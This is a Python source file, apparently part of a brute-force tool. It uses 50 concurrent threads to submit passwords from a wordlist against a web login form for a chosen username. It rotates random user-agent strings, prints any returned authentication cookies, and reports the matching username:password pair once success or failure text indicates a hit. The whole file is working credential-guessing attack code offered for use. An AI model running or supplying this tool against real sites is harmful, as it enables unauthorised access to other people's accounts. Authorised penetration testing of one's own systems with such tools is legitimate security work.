import os
import concurrent.futures
import random
import requests
import Core.settings

i = 0  # Global for keeping track of current password and total passwords.
password_count = 0  # Total passwords from password list
hard_quit = False  # Stop worker threads; global state


class PostFormLogin(Core.settings.Settings):

    def __init__(self, url: str, wordlist: str, username: str, username_field: str, password_field: str,
                 success_text: str, failure_text: str):
        Core.settings.Settings.__init__(self)
        self.url = url
        self.wordlist = wordlist
        self.username = username
        self.passwords = []
        self.username_field = username_field
        self.password_field = password_field
        self.success_text = success_text
        self.failure_text = failure_text

    def build_password_list(self):
        """
        Builds a list of passwords in memory for manipulation and processing.
        """
        with open(self.wordlist, 'r', errors="surrogateescape") as file_obj:

            for password in file_obj:
                try:
                    global password_count
                    password_count += 1
                    self.passwords.append(password)
                except UnicodeDecodeError:
                    print(f'[!] "{password.strip()}" is not UTF-8 encoded')
                    continue

        print(f'Prepared wordlist in memory with {password_count} entries.')

    def login_workers(self):
        """
        Creates the worker threads with concurrent.futures.
        """
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for password in self.passwords:
                futures.append(executor.submit(self.perform_login, password.strip()))

    def perform_login(self, password: str):
        """
        Attempts to login using credential data and POST method
        """
        global hard_quit
        global i
        global password_count

        if hard_quit:  # stops worker threads (killing process) on ctrl+c or username/password found
            pid = os.getpid()
            os.kill(pid, 9)

        credentials = {  # form fields
            self.username_field: self.username,
            self.password_field: password
        }

        cookies = {
        }

        if self.custom_user_agent:
            headers = {
                'user-agent': self.custom_user_agent
            }
        else:
            headers = {
                'user-agent': random.choice(self.user_agents)
            }

        response = requests.post(self.url, data=credentials, headers=headers)

        if response.cookies:
            for cookie in response.cookies:
                print(f"""
                Authentication cookie:
                {response.cookies}
                """)

        if self.success_text:
            if self.success_text in response.text:
                print(f"[+] {self.username}:{password}")
                hard_quit = True
            else:
                i += 1
                print(f"{i} of {password_count}", end="\r")

        if self.failure_text:
            if self.failure_text in response.text:
                i += 1
                print(f"{i} of {password_count}", end="\r")
            else:
                if i is 0:
                    print(f"[!] This could be a false positive if you've configured your --failure_text "
                          f"({self.failure_text}) incorrectly.")
                print(f"[+] {self.username}:{password}")
                hard_quit = True
                i += 1
                print(f"{i} of {password_count}", end="\r")
